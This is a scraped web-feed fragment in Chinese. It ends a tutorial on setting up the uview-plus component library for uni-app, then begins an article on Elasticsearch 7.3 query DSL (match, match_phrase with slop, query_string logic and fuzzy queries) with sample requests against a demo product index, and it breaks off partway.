thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><code>uview-plus</code> 是一个基于 <code>uni-app</code> 的高质量 UI 组件库，提供了丰富的组件和工具函数，帮助开发者快速构建跨平台应用。</p>
<h2 data-id="heading-0">1. 安装 uview-plus</h2>
<p>在项目中安装 <code>uview-plus</code>：</p>
<pre><code class="hljs language-bash" lang="bash">pnpm add uview-plus
</code></pre>
<h2 data-id="heading-1">2. 使用 easycom 方式引入组件</h2>
<p>在本项目中，<code>uview-plus</code> 是通过 <code>easycom</code> 的方式按需引入组件的。以下是具体使用方法：</p>
<h3 data-id="heading-2">2.1 配置组件路径</h3>
<p>在 <code>pages.json</code> 中配置 <code>easycom</code> 规则：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"easycom"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"autoscan"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"custom"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"^u-(.*)"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"uview-plus/components/u-$1/u-$1.vue"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"^up-(.*)"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"uview-plus/components/u-$1/u-$1.vue"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>说明：</strong></p>
<ul>
<li><code>autoscan</code>: 设置为 <code>true</code>，自动扫描 <code>node_modules/uview-plus/components</code> 目录下的组件。</li>
<li><code>custom</code>: 自定义组件匹配规则，<code>^u-(.*)</code> 和 <code>^up-(.*)</code> 表示以 <code>u-</code> 或 <code>up-</code> 开头的组件名会匹配到 <code>uview-plus</code> 的对应组件路径。</li>
</ul>
<h3 data-id="heading-3">2.2 使用组件</h3>
<p>配置完成后，可以直接在页面中使用 <code>uview-plus</code> 的组件，无需手动引入。例如：</p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;view&gt;
    &lt;u-button type="primary"&gt;主要按钮&lt;/u-button&gt;
    &lt;up-button type="success"&gt;成功按钮&lt;/up-button&gt;
  &lt;/view&gt;
&lt;/template&gt;
</code></pre>
<h2 data-id="heading-4">3. 自定义主题</h2>
<p><code>uview-plus</code> 支持通过 SCSS 变量自定义主题。以下是推荐的自定义主题方案：</p>
<h3 data-id="heading-5">3.1 创建自定义主题文件</h3>
<p>在项目的 <code>src/styles</code> 目录下新建一个 <code>uview-plus.theme.scss</code> 文件，并将 <code>node_modules/uview-plus/theme.scss</code> 中的所有变量复制到该文件中。例如：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-variable">$u-primary</span>: <span class="hljs-number">#007aff</span>; <span class="hljs-comment">// 修改主色</span>
<span class="hljs-variable">$u-success</span>: <span class="hljs-number">#4cd964</span>; <span class="hljs-comment">// 修改成功色</span>
<span class="hljs-variable">$u-warning</span>: <span class="hljs-number">#f0ad4e</span>; <span class="hljs-comment">// 修改警告色</span>
<span class="hljs-variable">$u-error</span>: <span class="hljs-number">#dd524d</span>; <span class="hljs-comment">// 修改错误色</span>
<span class="hljs-comment">// 其他变量...</span>
</code></pre>
<p>根据需求修改这些变量的值，以实现自定义主题。</p>
<h3 data-id="heading-6">3.2 引入自定义主题文件</h3>
<p>在 <code>src/uni.scss</code> 文件的顶部引入自定义主题文件：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-keyword">@import</span> <span class="hljs-string">'@/styles/uview-plus.theme.scss'</span>;
</code></pre>
<p>通过这种方式，<code>uview-plus</code> 的组件将使用自定义的主题变量。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[大数据-174 Elasticsearch 查询 DSL 实战：match/match_phrase/query_string/multi_match 全解析]]></title>    <link>https://juejin.cn/post/7579917791764807707</link>    <guid>https://juejin.cn/post/7579917791764807707</guid>    <pubDate>2025-12-05T03:17:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579917791764807707" data-draft-id="7579961957221023771" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="大数据-174 Elasticsearch 查询 DSL 实战：match/match_phrase/query_string/multi_match 全解析"/> <meta itemprop="keywords" content="后端,大数据,Elasticsearch"/> <meta itemprop="datePublished" content="2025-12-05T03:17:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="武子康"/> <meta itemprop="url" content="https://juejin.cn/user/149189314230039"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            大数据-174 Elasticsearch 查询 DSL 实战：match/match_phrase/query_string/multi_match 全解析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/149189314230039/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    武子康
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:17:25.000Z" title="Fri Dec 05 2025 03:17:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">TL;DR</h2>
<ul>
<li>场景：在 Elasticsearch 7.3 中用查询 DSL 做全文检索，而不是靠 Kibana 点选和简单关键字搜索。</li>
<li>结论：区分 match、match_phrase、query_string、multi_match 的匹配边界和分词语义，是中文搜索是否“搜得到”的关键。</li>
<li>产出：一套可直接复制的 DSL 示例与排错思路，覆盖中文分词、逻辑查询、多字段匹配和常见“查不到数据”的问题定位。</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/67f123ad8a594f3ab926af631d9d62b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509445&amp;x-signature=B66cYktM0dUDNTg0%2Bk5hh04ko8g%3D" alt="大数据-174 Elasticsearch 查询 DSL 实战：match/match_phrase/query_string/multi_match 全解析" loading="lazy"/></p>
<h2 data-id="heading-1">版本矩阵</h2>

















<table><thead><tr><th>Elasticsearch 版本</th><th>已验证说明</th></tr></thead><tbody><tr><td>7.3</td><td>是全文示例基于 7.3 官方 DSL 文档与实际集群验证，语法与截图一一对应。</td></tr><tr><td>7.4–7.17</td><td>部分查询 DSL 语法整体兼容，match、match_phrase、query_string、multi_match 用法基本一致，个别参数以官方文档为准。</td></tr></tbody></table>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ce294769cd5d4439b97113ef70fbbcb7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509445&amp;x-signature=kuuWar5DB7Hz2jlpdOG77dlqGJk%3D" alt="Elasticsearch" loading="lazy"/></p>
<h2 data-id="heading-2">官方地址</h2>
<pre><code class="hljs language-shell" lang="shell">https://www.elastic.co/guide/en/elasticsearch/reference/7.3/query-dsl.html
</code></pre>
<p>Elasticsearch提供了基于JSON的完整查询DSL（Domain Specific Language 特定域语言）来定义查询，将查询 DSL 视为查询AST（抽象语法树），它由两种子句组成：</p>
<ul>
<li>叶子查询句 叶子查询子句 在特定域中寻找特定的值，如 match、term、range 查询</li>
<li>复合查询子句 复合查询子句包装其他叶子查询或复合查询，并用于以逻辑方式组合多个查询（例如 bool或dis_max查询），或更改其行为（如 constant_score 查询）
我们在使用Elasticsearch的时候，避免不使用DSL语句去查询，就像使用关系型数据库的时候要学会使用SQL一样。</li>
</ul>
<h2 data-id="heading-3">查询所有</h2>
<p>示例</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">查询所有数据</span>
POST /wzkicu-index/_search
{
  "query":{
    "match_all": {}
  }
}
</code></pre>
<ul>
<li>query 代表查询的对象</li>
<li>match_all 代表查询所有</li>
</ul>
<p>执行后，结果如下：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f6671f5047784bce8a8eff8ce1acef49~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509445&amp;x-signature=m%2FxxerogvGZh5zsQ8w02iXot%2FAU%3D" alt="Elasticsearch 查询语法" loading="lazy"/>
结果中：</p>
<ul>
<li>took 查询花费时间，单位是毫秒</li>
<li>time_out 是否超时</li>
<li>_shards 分片信息</li>
<li>hits 搜索结果总览对象</li>
<li>total 搜索到的总数</li>
<li>max_score 所有结果中文档得分的最高分</li>
<li>_index 索引库</li>
<li>_type 文档类型</li>
<li>_id 文档id</li>
<li>_score 文档得分</li>
<li>_source 文档的数据源</li>
</ul>
<h2 data-id="heading-4">全文检索（full-text query）</h2>
<p>全文搜索能够搜索已分析的文本字段，如电子邮件正文、商品描述，使用索引期间应用于字段的同一分词处理查询字符串，全文搜索的分类很多，有如下的这么几种。</p>
<h3 data-id="heading-5">匹配搜索（match query）</h3>
<p>全文查询的标准查询，查询条件比较宽松：</p>
<ul>
<li>需要指定字段名</li>
<li>输入文本会进行分词，比如hello world，会拆分成 hello 和 world，然后进行匹配，如果字段内容中包含hello或者world，name就会被查询出来。也就是说match是一个部分匹配的模糊查询。</li>
</ul>
<p>match queries 接收 text/numerics/dates，对它们进行分词分析，再组织成一个boolean查询，可通过operator指定bool组合操作（or、and、默认是or）。</p>
<p>假设一个案例，目前索引库中，有两部手机，一台电视：
先新增索引库：</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">创建索引</span>
PUT /wzk-property
{
  "settings": {},
  "mappings": {
    "properties": {
      "title": {
        "type": "text",
        "analyzer": "ik_max_word"
      },
      "images": {
        "type": "keyword"
      },
      "price": {
        "type": "float"
      }
    }
  }
}
</code></pre>
<p>执行的结果如下图所示：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/53e4c8a09db54d3cbbd83148af634b84~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509445&amp;x-signature=E9OsHRS0h%2FGMrlCBgq6nTcdf1QI%3D" alt="Elasticsearch 分词" loading="lazy"/>
接着我们写入一些数据进去：</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">添加数据1</span>
POST /wzk-property/_doc/
{
  "title": "小米电视4A",
  "images": "https://profile-avatar.csdnimg.cn/755ff10be62f4e7081bc36028fa9eafe_w776341482.jpg!1",
  "price": 4288
}
<span class="hljs-meta prompt_">
# </span><span class="bash">添加数据2</span>
POST /wzk-property/_doc/
{
  "title": "小米手机",
  "images": "https://profile-avatar.csdnimg.cn/755ff10be62f4e7081bc36028fa9eafe_w776341482.jpg!1",
  "price": 2699
}
<span class="hljs-meta prompt_">
# </span><span class="bash">添加数据3</span>
POST /wzk-property/_doc/
{
  "title": "华为手机",
  "images": "https://profile-avatar.csdnimg.cn/755ff10be62f4e7081bc36028fa9eafe_w776341482.jpg!1",
  "price": 5699
}

</code></pre>
<p>执行结果如下图所示：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f8e62e75d3dd4325aadeb717ac85e3f5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509445&amp;x-signature=Vd%2BQCg2V2ek%2BjI%2BZt89vXGLXh%2Bc%3D" alt="Elasticsearch 添加数据" loading="lazy"/>
我们进行or关系的match搜索，会把查询条件进行分词，然后进行查询，多个词条之间是or的关系：</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">match 分词匹配</span>
POST /wzk-property/_search
{
  "query":{
    "match":{
      "title":"小米电视4A"
    }
  }
}
</code></pre>
<p>执行结果如下图所示：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6ead348e025844c282790987fac61c7a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509445&amp;x-signature=IdSvEIebWmZHsUefA1GA846YSUI%3D" alt="Elasticsearch 匹配查询" loading="lazy"/>
我们可以看到，不仅查到了小米电视、还查询到了小米手机。这不是我们要的结果。此时我们需要使用 and 的方式来进行精确的查找：</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">match 分词匹配 title字段 同时 分词后的每个词 都要匹配到才可以（and）</span>
POST /wzk-property/_search
{"query":
  {
    "match": {
      "title":
      {
        "query": "小米电视4A",
        "operator": "and"
      }
    }
  }
}
</code></pre>
<p>执行结果如下，可以看到已经精准匹配到了：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fb174886256b473c8c2de36e96ffe61b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509445&amp;x-signature=6IcgOkYqgo%2F%2F8iAyyj3UwMRKrpw%3D" alt="Elasticsearch 精确匹配" loading="lazy"/></p>
<h3 data-id="heading-6">短语搜索（match phrase query）</h3>
<p>match_query是分词的，text也是分词的，match_phrase的分词结果必须在text字段中都包含，而且顺序必须相同，而且必须是连续的：</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">分词匹配但考虑顺序</span>
<span class="hljs-meta prompt_"># </span><span class="bash">match是不考虑分词出现的顺序</span>
<span class="hljs-meta prompt_"># </span><span class="bash">match_phrase 将遵循分词的出现顺序才进行匹配</span>
POST /wzk-property/_search
{
  "query": {
    "match_phrase": {
      "title": "小米电视"
    }
  }
}
</code></pre>
<p>执行结果如下图所示：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1677f2caa9ff45c6923b909a7002a90a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509445&amp;x-signature=FoB50mVBH1P5pUfrecnOq1IP7rc%3D" alt="Elasticsearch 短语搜索" loading="lazy"/></p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">match_phrase 分伺后：1电视 2小米</span>
<span class="hljs-meta prompt_"># </span><span class="bash">因为条目中 小米电视的出现不是 1、2，所以没有匹配到</span>
POST /wzk-property/_search
{
  "query": {
    "match_phrase": {
      "title": "电视小米"
    }
  }
}
</code></pre>
<p>执行结果如下图所示：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0342630862694425970d054a43400807~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509445&amp;x-signature=5n%2FkvCNQFpU1nw3rvxXPeMlGUM4%3D" alt="Elasticsearch 分词检索" loading="lazy"/></p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">match_phrase 分词 1是小米 2是4A</span>
<span class="hljs-meta prompt_"># </span><span class="bash">但是由于 原：小米电视4A，对比中没有严格按照1、2的顺序</span>
<span class="hljs-meta prompt_"># </span><span class="bash">所以没有结果</span>
POST /wzk-property/_search
{
  "query": {
    "match_phrase": {
      "title": "小米4A"
    }
  }
}
</code></pre>
<p>执行结果如下图所示：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/520e6cff3b074129b28e8c611e167312~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509445&amp;x-signature=ACwzt5jX2Kszyxgb3yOv3Gokj80%3D" alt="Elasticsearch 分词检索" loading="lazy"/>
但是对于刚才的结果，可能我们希望使用  小米4A，可以按照 match_phrase 的顺序来查找到 小米电视4A，而不用严格遵守顺序，可以跳过几个词：</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">通过 slop 可以跳过一个词 来让 match_phrase 匹配到顺序的结果</span>
POST /wzk-property/_search
{
  "query": {
    "match_phrase": {
      "title": {
        "query": "小米4A",
        "slop": 1
      }
    }
  }
}
</code></pre>
<h3 data-id="heading-7">query_string 查询</h3>
<p>该查询与match类似，但是match需要指定字段名，query_string是在所有字段中搜索，范围更广泛。
Query String Query提供了无需指定某字段而对文档全文进行匹配查询的一个高级查询，同时可以指定在哪些字段上进行匹配。</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">广泛查询 所有字段中查找 2699</span>
POST /wzk-property/_search
{
  "query": {
    "query_string": {
      "query": "2699"
    }
  }
}
</code></pre>
<p>执行结果如下图所示：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2983d5a471634275947a29a92171c65f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509445&amp;x-signature=XrQfm7kOX3cWDmEuUB2UjwL9mZM%3D" alt="Elasticsearch query string" loading="lazy"/></p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">广泛查找 但是你希望从这个default_field字段中查找</span>
POST /wzk-property/_search
{
  "query": {
    "query_string": {
      "query": "2699",
      "default_field": "title"
    }
  }
}
</code></pre>
<p>执行结果如下图所示：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8660078aa59c4da78c3a58e0e49687c5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509445&amp;x-signature=FA1BIylTjULSZVpirRXf8n%2FAMPY%3D" alt="Elasticsearch match phrase" loading="lazy"/></p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">逻辑查询 使用 OR 或者 AND</span>
POST /wzk-property/_search
{
  "query": {
    "query_string": {
      "query": "手机 OR 小米",
      "default_field": "title"
    }
  }
}
</code></pre>
<p>执行结果下图所示：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/78192c1b709c412b8d5f359fa5ec5de1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509445&amp;x-signature=P0jdZdEy0MdvGU6DiVdKDHZOlTs%3D" alt="Elasticsearch 查询数据" loading="lazy"/></p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">逻辑查询 使用 OR 或者 AND</span>
POST /wzk-property/_search
{
  "query": {
    "query_string": {
      "query": "手机 AND 小米",
      "default_field": "title"
    }
  }
}
</code></pre>
<p>执行结果如下图所示：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d898d32254154fdf92d709fcbe6f7d2c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509445&amp;x-signature=6CZk%2FMDczIua%2F8Uh4b7posbrUxI%3D" alt="Elasticsearch 逻辑查询" loading="lazy"/></p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">模糊查询，表示 小米 这个词可以有1个词变动</span>
<span class="hljs-meta prompt_"># </span><span class="bash">比如：小明、米小 都是可以查询出来的</span>
POST /wzk-property/_search
{
  "query": {
    "query_string": {
      "query": "小米~1",
      "default_field": "title"
    }
  }
}
</code></pre>
<p>执行结果如下图所示：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/afb0afa7494f45d984654e355f01ba7c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509445&amp;x-signature=3pvVWHu6ZJ3E%2Fgck%2BrioJJ%2B3NTw%3D" alt="Elasticsearch 查询结果" loading="lazy"/></p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">模糊查询，表示 小米 这个词可以有1个词变动</span>
<span class="hljs-meta prompt_"># </span><span class="bash">比如：小明、米小 都是可以查询出来的</span>
<span class="hljs-meta prompt_"># </span><span class="bash">以此类推，如果是 小米~2 那就两个词都可以变动...</span>
POST /wzk-property/_search
{
  "query": {
    "query_string": {
      "query": "米小~1",
      "default_field": "title"
    }
  }
}
</code></pre>
